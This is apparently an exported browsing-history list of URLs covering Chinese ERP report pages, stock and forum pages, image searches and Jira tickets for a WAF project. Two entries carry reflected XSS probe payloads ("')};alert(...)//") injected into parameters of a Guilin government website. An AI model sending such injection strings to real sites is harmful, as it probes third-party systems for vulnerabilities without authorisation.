http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=&chromeType=4&ShowType=ModalRef&SOB=1001712080002065&SOBVersion=-1&IsForReport=1&FilterRefTag=Report&__sk=__SK76075&__curOId=1001712070000049&layerId=170endLayerId,236,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=&chromeType=4&ShowType=ModalRef&SOB=1001712080002065&SOBVersion=-1&IsForReport=1&FilterRefTag=Report&__sk=__SK76075&__curOId=1001712070000049&layerId=180endLayerId,237,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=&chromeType=4&ShowType=ModalRef&SOB=1001712080002065&SOBVersion=-1&IsForReport=1&FilterRefTag=Report&__sk=__SK76075&__curOId=1001712070000049&layerId=252endLayerId,238,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=12endLayerId,239,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=19endLayerId,240,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=22endLayerId,241,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=25endLayerId,242,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=30endLayerId,243,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=3endLayerId,244,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=64endLayerId,245,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK51889&__curOId=1001712070000049&layerId=6endLayerId,246,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=129endLayerId,247,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=185endLayerId,248,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=196endLayerId,249,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=206endLayerId,250,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=208endLayerId,251,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001712080002065&SOBVersion=0&IsLeaf=1&__sk=__SK6347&__curOId=1001712070000049&layerId=210endLayerId,252,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&QueryNameField=NaturalAccount_Name&QueryField=NaturalAccount_Code&NaturalAccount_Code=660240&ValueByClick=660240&__sk=__SK36221&__curOId=1001801170012724&layerId=39endLayerId,253,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK14794&__curOId=1001801170012724&layerId=85endLayerId,254,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK36221&__curOId=1001801170012724&layerId=43endLayerId,255,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK36221&__curOId=1001801170012724&layerId=94endLayerId,256,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=24endLayerId,257,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=30endLayerId,258,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=35endLayerId,259,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=37endLayerId,260,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&__sk=__SK83948&__curOId=1001801170012724&layerId=45endLayerId,261,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=221101&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E5%B7%A5%E8%B5%84&__sk=__SK36221&__curOId=1001801170012724&layerId=59endLayerId,262,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=22110701&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E5%85%BB%E8%80%81%E4%BF%9D%E9%99%A9&__sk=__SK83948&__curOId=1001801170012724&layerId=47endLayerId,263,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=22110702&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E5%8C%BB%E7%96%97%E4%BF%9D%E9%99%A9&__sk=__SK83948&__curOId=1001801170012724&layerId=49endLayerId,264,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=224104&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E7%A4%BE%E4%BF%9D&__sk=__SK83948&__curOId=1001801170012724&layerId=33endLayerId,265,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=66010106&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&ValueByClick=%E4%BD%8F%E6%88%BF%E5%85%AC%E7%A7%AF%E9%87%91&__sk=__SK83948&__curOId=1001801170012724&layerId=28endLayerId,266,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=c4dae642-0187-4070-90b7-092cbc083aa5&CtrlId=10017120-8000-2033-0000-000000000000&chromeType=4&ShowType=ModalRef&NACode=66024099&SOB=1001801190006636&SOBVersion=0&IsLeaf=1&QueryNameField=NaturalAccount_Name&QueryField=NaturalAccount_Code&NaturalAccount_Code=6601&ValueByClick=6601&__sk=__SK36221&__curOId=1001801170012724&layerId=48endLayerId,267,0
"http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=d8c3da38-6e99-49fa-8e9f-23dd7a01bc0d&CtrlId=861efa0d-7ad4-4f3f-af82-e2af3fd64767&chromeType=4&ShowType=ModalRef&CurOrgID=1001712070000049&CurDate=2020-02-24%2018%3A45%3A28&UBF_CustomFilter=Org%20=%201001712070000049%20and%20BusinessType%20in%20(316,317,318,319,321,327,328,%20320)%20and%20IsFillin%20=%20%27false%27%20and%20%20IsInitPO%20=%20%27false%27&ValueByClick=%E7%94%9F%E4%BA%A7%E7%89%A9%E6%96%99%E9%87%87%E8%B4%AD&MultiOrgID=&EntityFullName=UFIDA.U9.PM.Pub.PODocType&__sk=__SK80131&__curOId=1001712070000049&layerId=14endLayerId",268,0
http://erp.*.com.cn/U9/ufsoft/simple.aspx?lnk=f4e7e41f-f46b-4c5b-b7a2-5be7ecea9d76&CtrlId=d06691f7-b9fc-4825-90c1-42b542942753&chromeType=4&ShowType=ModalRef&DPBook=1001712200000841&MultiOrgID=1001712070000049&EntityFullName=UFIDA.U9.Base.SOB.SOBAccountingPeriod&__sk=__SK91823&__curOId=1001712070000049&layerId=19endLayerId,269,0
http://fanyi.youdao.com/,270,0
http://finance.sina.com.cn/realstock/company/sh000001/nc.shtml,271,0
http://finance.sina.com.cn/realstock/company/sh600200/nc.shtml?from=BaiduAladin,272,0
http://finance.sina.com.cn/realstock/company/sh600312/nc.shtml,273,0
http://finance.sina.com.cn/realstock/company/sh600312/nc.shtml?from=BaiduAladin,274,0
http://finance.sina.com.cn/realstock/company/sh601099/nc.shtml,275,0
http://finance.sina.com.cn/realstock/company/sh601111/nc.shtml,276,0
http://finance.sina.com.cn/realstock/company/sh601162/nc.shtml,277,0
http://finance.sina.com.cn/realstock/company/sh601988/nc.shtml,278,0
http://finance.sina.com.cn/realstock/company/sh603416/nc.shtml,279,0
http://finance.sina.com.cn/realstock/company/sh688023/nc.shtml,280,0
http://finance.sina.com.cn/realstock/company/sz000988/nc.shtml,281,0
http://finance.sina.com.cn/realstock/company/sz002185/nc.shtml,282,0
http://finance.sina.com.cn/realstock/company/sz002460/nc.shtml,283,0
http://finance.sina.com.cn/realstock/company/sz300456/nc.shtml,284,0
http://finance.sina.com.cn/realstock/company/sz300803/nc.shtml,285,0
http://finance.sina.com.cn/roll/2020-02-26/doc-iimxxstf4381844.shtml,286,0
http://ftp-new-pc.pconline.com.cn/1406a788573ce787ad5351940dcf7e4e/pub/download/201902/pconline1550817108484.exe,287,0
http://ftrans.cn/solutions/large-file-transfer/?utm_source=baidu_sem&utm_campaign=V5.52.02.%E5%A4%A7%E6%96%87%E4%BB%B6-%E5%8A%9F%E8%83%BD&utm_term=%E5%A4%A7%E6%96%87%E4%BB%B6%20%E4%BC%A0%E8%BE%93&e_creative=21622197755&e_adposition=cl1&e_pagenum=1&e_keywordid=68900829524&e_keywordid2=68900829524,288,0
http://gaj.guilin.gov.cn/site/public/TechListSearchgzdt.aspx,289,0
http://gaj.guilin.gov.cn/site/public/TechListSearchgzdt.aspx?__EVENTVALIDATION=%27)};alert(49453)//,290,0
http://gaj.guilin.gov.cn/site/public/techzs.aspx?menuid=400610,291,0
http://gaj.guilin.gov.cn/site/public/techzs.aspx?menuid=400610&%27)};alert(17412)//=2,292,0
http://gb.oversea.cnki.net//KCMS/docdown/pubdownload.aspx?dk=kdoc%3acajdown%3add97542b6cfe67efabfded5a2704e65a,293,0
http://gb.oversea.cnki.net//KCMS/docdown/pubdownload.aspx?dk=kdoc%3apdfdown%3a2dfdb899c2586cd70f2752b1f3637d5d,294,0
http://gb.oversea.cnki.net/KCMS/detail/detail.aspx?filename=CINS201304017&dbcode=CJFD&dbname=CJFD2013&UID=WEEvREcwSlJHSldTTEYzVDhUSFJPcG1FSzJicGNiZm1sVlltOGU2ZlBURT0%3d%249A4hF_YAuvQ5obgVAqNKPCYcEjKensW4IQMovwHtwkF4VYPoHbKxJw!!&autoLogin=0,295,0
http://go.sogou.com/css/api/CaleWeather.css,296,0
http://greatagain.*.com.cn/,297,0
http://gswsdj.zjzwfw.gov.cn/entrance.html,298,0
"http://guba.eastmoney.com/concept/list,300033.html?tabtype=99",299,0
"http://guba.eastmoney.com/list,000063.html",300,0
"http://guba.eastmoney.com/list,000545.html",301,0
"http://guba.eastmoney.com/list,000623.html?from=BaiduAladdin",302,0
"http://guba.eastmoney.com/list,000725.html",303,0
"http://guba.eastmoney.com/list,002503.html",304,0
"http://guba.eastmoney.com/list,300716.html?from=BaiduAladdin",305,0
"http://guba.eastmoney.com/list,600237.html?from=BaiduAladdin",306,0
"http://guba.eastmoney.com/list,601618,1,f.html",307,0
"http://guba.eastmoney.com/list,601618.html?from=BaiduAladdin",308,0
"http://guba.eastmoney.com/list,688023.html?from=BaiduAladdin",309,0
"http://guba.eastmoney.com/list,688023_2.html",310,0
"http://guba.eastmoney.com/list,688090.html",311,0
"http://guba.eastmoney.com/list,688090.html?from=BaiduAladdin",312,0
"http://guba.eastmoney.com/news,000545,903787464.html",313,0
"http://guba.eastmoney.com/news,300620,906171084.html",314,0
"http://guba.eastmoney.com/news,600237,906591061.html",315,0
"http://guba.eastmoney.com/news,688023,884823196.html",316,0
"http://guba.eastmoney.com/news,688023,902906270.html?from=BaiduAladdin",317,0
"http://guba.eastmoney.com/news,688023,904746106.html",318,0
"http://guba.eastmoney.com/news,688023,905739584.html",319,0
"http://guba.eastmoney.com/news,688023,905783139.html",320,0
"http://guba.eastmoney.com/news,688023,906168377.html",321,0
"http://guba.eastmoney.com/news,688023,906339802.html",322,0
"http://guba.eastmoney.com/news,688023,906843961.html",323,0
"http://guba.eastmoney.com/news,cjpl,906572074.html",324,0
"http://guba.eastmoney.com/news,dcblog,834638907.html",325,0
http://guba.eastmoney.com/news_soft.aspx?color=b&code=688023&id=906843961,326,0
http://guba.eastmoney.com/qa/qa_search.aspx?company=300033&keyword=&questioner=&qatype=1,327,0
http://guba.eastmoney.com/qa/search?type=2&code=300033,328,0
http://hanlp.com/,329,0
http://hao.qq.com/?unc=Af31026&s=o400493_1,330,0
http://help.iqiyi.com/questionInfo/3186.html,331,0
http://home.firefoxchina.cn/,332,0
http://hz.zjzwfw.gov.cn/col/col1962/index.html?tabid=45023,333,0
"http://image.baidu.com/search/detail?ct=503316480&z=undefined&tn=baiduimagedetail&ipn=d&word=%E5%A3%81%E7%BA%B8&step_word=&ie=utf-8&in=&cl=&lm=-1&st=undefined&hd=undefined&latest=undefined&copyright=undefined&cs=3730267016,1291960719&os=3279078104,2183212087&simid=3446727280,174503358&pn=121&rn=1&di=20900&ln=3132&fr=&fmq=1582535805214_R&fm=&ic=undefined&s=undefined&se=&sme=&tab=0&width=1920&height=1080&face=undefined&is=0,0&istype=0&ist=&jit=&bdtype=0&spn=0&pi=0&gsm=5a&oriquery=%E5%A3%81%E7%BA%B8&objurl=http%3A%2F%2Fimg.pconline.com.cn%2Fimages%2Fupload%2Fupc%2Ftx%2Fwallpaper%2F1208%2F15%2Fc0%2F12924355_1344999165550.jpg&rpstart=0&rpnum=0&adpicid=0&force=undefined&ctd=1582535841487^3_1519X763%1",334,0
http://image.baidu.com/search/index?tn=baiduimage&ct=201326592&lm=-1&cl=2&ie=gb18030&word=%D7%C0%C3%E6%B1%DA%D6%BD&fr=ala&ala=1&pos=0&alatpl=wallpaper&oriquery=%E6%A1%8C%E9%9D%A2%E5%A3%81%E7%BA%B8,335,0
http://image.baidu.com/search/index?tn=baiduimage&ct=201326592&lm=-1&cl=2&ie=gb18030&word=confluence%D6%D0%D3%D0%D0%F2%C1%D0%B1%ED%BA%F3%B2%E5%C8%EB%CD%BC%C6%AC&fr=ala&ala=2&alatpl=sp&pos=0,336,0
http://image.baidu.com/search/index?tn=baiduimage&ps=1&ct=201326592&lm=-1&cl=2&nc=1&ie=utf-8&word=app%E9%95%BF%E8%A1%A8%E5%8D%95,337,0
http://image.baidu.com/search/index?tn=baiduimage&ps=1&ct=201326592&lm=-1&cl=2&nc=1&ie=utf-8&word=web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8,338,0
http://info.pinyin.sogou.com/ime_push/getxinci.php?h=D53B43D1F76E2ECF8815D05DB3DCE579&v=9.5.0.3517&r=0000_sogou_pinyin_67d&passport=&ppversion=3.1.0.2216&id=Y10000001&newwordver=1582532700&activeprocess=chrome.exe&configver=604&pageurl=link_index_new.php&adurl=http://info.pinyin.sogou.com/ime_push/sgse_ad/sgse_s_all_new.php,339,0
http://isdp-dg.huawei.com/sdcloud/portal/index.html,340,0
http://iwencai.com/unifiedwap/result?w=%E7%A7%91%E5%88%9B%E6%9D%BF%20%E4%B8%9A%E7%BB%A9%E5%BF%AB%E6%8A%A5&querytype=&issugs,341,0
http://jira.das-security.cn/secure/Dashboard.jspa,342,0
http://jira.info.*.com.cn/browse/APT-865,343,0
http://jira.info.*.com.cn/browse/APT-876,344,0
http://jira.info.*.com.cn/browse/APT-879?filter=-2,345,0
http://jira.info.*.com.cn/browse/UT-245,346,0
http://jira.info.*.com.cn/browse/UT-259,347,0
http://jira.info.*.com.cn/browse/UT-263,348,0
http://jira.info.*.com.cn/browse/UT-274?filter=-2&jql=reporter%20in%20(currentUser())%20order%20by%20created%20DESC,349,0
http://jira.info.*.com.cn/browse/UT-286,350,0
http://jira.info.*.com.cn/projects/SUMAP/summary,351,0
http://jira.info.*.com.cn/secure/Dashboard.jspa,352,0
http://jira.info.*.com.cn/secure/Dashboard.jspa?selectPageId=10904,353,0
http://jira.ngwdev.com/browse/WAF-365?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20ASC,354,0
http://jira.ngwdev.com/browse/WAF-373,355,0
http://jira.ngwdev.com/browse/WAF-391?filter=-2,356,0
http://jira.ngwdev.com/browse/WAF-392?filter=-2,357,0
http://jira.ngwdev.com/browse/WAF-393?filter=-2,358,0
http://jira.ngwdev.com/browse/WAF-405?filter=-2,359,0
http://jira.ngwdev.com/browse/WAF-406?filter=-2,360,0
http://jira.ngwdev.com/browse/WAF-415,361,0
http://jira.ngwdev.com/browse/WAF-418,362,0
http://jira.ngwdev.com/browse/WAF-419,363,0
http://jira.ngwdev.com/browse/WAF-419?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13)%20ORDER%20BY%20status%20ASC,364,0
http://jira.ngwdev.com/browse/WAF-420,365,0
http://jira.ngwdev.com/browse/WAF-421?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13)%20ORDER%20BY%20status%20ASC,366,0
http://jira.ngwdev.com/browse/WAF-423,367,0
http://jira.ngwdev.com/browse/WAF-424?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.*,368,0
http://jira.ngwdev.com/browse/WAF-424?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20ASC,369,0
http://jira.ngwdev.com/browse/WAF-427,370,0
http://jira.ngwdev.com/browse/WAF-427?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,371,0
http://jira.ngwdev.com/browse/WAF-429?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,372,0
http://jira.ngwdev.com/browse/WAF-430,373,0
http://jira.ngwdev.com/browse/WAF-435,374,0
http://jira.ngwdev.com/browse/WAF-436?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,375,0
http://jira.ngwdev.com/browse/WAF-437?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20ASC,376,0
http://jira.ngwdev.com/browse/WAF-437?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,377,0
http://jira.ngwdev.com/browse/WAF-438,378,0
http://jira.ngwdev.com/browse/WAF-439,379,0
http://jira.ngwdev.com/browse/WAF-440,380,0
http://jira.ngwdev.com/browse/WAF-441,381,0
http://jira.ngwdev.com/download/resources/rw-smart-checklist-biz:resources/checklist.html?context=agile_board,382,0
http://jira.ngwdev.com/download/resources/rw-smart-checklist-biz:resources/checklist.html?context=issue_details,383,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.*,384,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20ASC,385,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20%3D%204.6.12%20ORDER%20BY%20status%20DESC,386,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13),387,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13)%20ORDER%20BY%20status%20ASC,388,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20AND%20fixVersion%20in%20(4.6.12%2C%204.6.13)%20ORDER%20BY%20status%20DESC,389,0
http://jira.ngwdev.com/issues/?jql=project%20%3D%20WAF%20ORDER%20BY%20key%20DESC%2C%20status%20ASC,390,0
http://jira.ngwdev.com/issues/?jql=project+%3D+WAF+AND+fixVersion+%3D+4.6.*,391,0
http://jira.ngwdev.com/login.jsp?permissionViolation=true&os_destination=%2Fbrowse%2FWAF-438&page_caps=&user_role=,392,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3A%2FXQq6veVsMmYNCtUxD%2BLx8qGt63DUxCFA2eSCpKeEEhDK1x0qZyxm3kUfTaTiwj1CVjsbXOeP5pvNcE1S0CyxtxQOXldoO0Ab5DAaajaunY13%2FGQlb2xubMEUwHjQ98xiqw1AgauPO%2BH7IcLoS0aYNZSSfyhxufBFAp6n8j6u008n2p4Y1hfdUsPmOgGiO%2Bb3H8bnZ0J8ynNOhqO6NA7whu9GOpbi2RpoGWWpy%2BzlYWcuztL1vTygsM%2BT6F8rckNveu2GW%2B85GSb%2Fu8r1SfodlnW%2FLyvt3FMlwId%2FZzN85IZ22AO7sl08yavenQn6IMSblZCuTFSx4igfMa112el7F4PWwg%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,393,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3A6ZYQExlhlR2%2BR14Mw3yGaoL0EDmtNhLrrNwigYLzvW4gVAUJZSicE9in1epaLbIJ2E10gJV%2BERGq36vOeQZpteWFxT%2FGMUu3syiOpTYTjaMBLAxNa9b%2F2D0GNUvuDpGm%2F%2BX6TW86Y8Frz93%2BYz7L%2BlCp4zxQxDKKS2lDi5BlJ9dQL3tq7ytoYL00aktihM%2FxnaqsDmAzEC10xv3SfJFa3N1%2F%2FYODMXi2MtSxhqd8yRVCLc7y%2BR%2Fk1rRjrGoXvNwtXHINo1TtJap%2BYnXvOqyhD9C8An6AcN0Cpn%2BOcOpgGuqBkhui6T11aRrCorvnuORl5IXCqTWWxUqOPN0yhTBDRGD%2B3tg%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,394,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AZmZUb%2FQLtPoo5rLaIl4C2Vd47Bq%2BszMIRzl5xJJ60UcrZMJSjrNwKn0nb9g0FpwcFK1e5eedt3p7X75WDXB42Sj%2B35i%2BwFMamvsPC%2BClDqyoecpYMNTijdVP8iFQR2jMWj3KlsFK6%2BYtbZ5YM2yqI1HMhWH5WuLJ1UJrX30cQeNvD6GdbcxR4iBCq5khEXTglycibhEsVruU0s2dhRw0O0UAK3fm1ITS79fky3GFC1czvCqeCYPlKF%2FhSKPxjp5fk2TWcbWyJOuW0EyOw700A7rzpdFYU0yWk3O%2Fo91jyFDVujUhGnGonHjqQJZ%2FBwpFezEI11gMJxPGbQdKxn8evfnh7ds%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=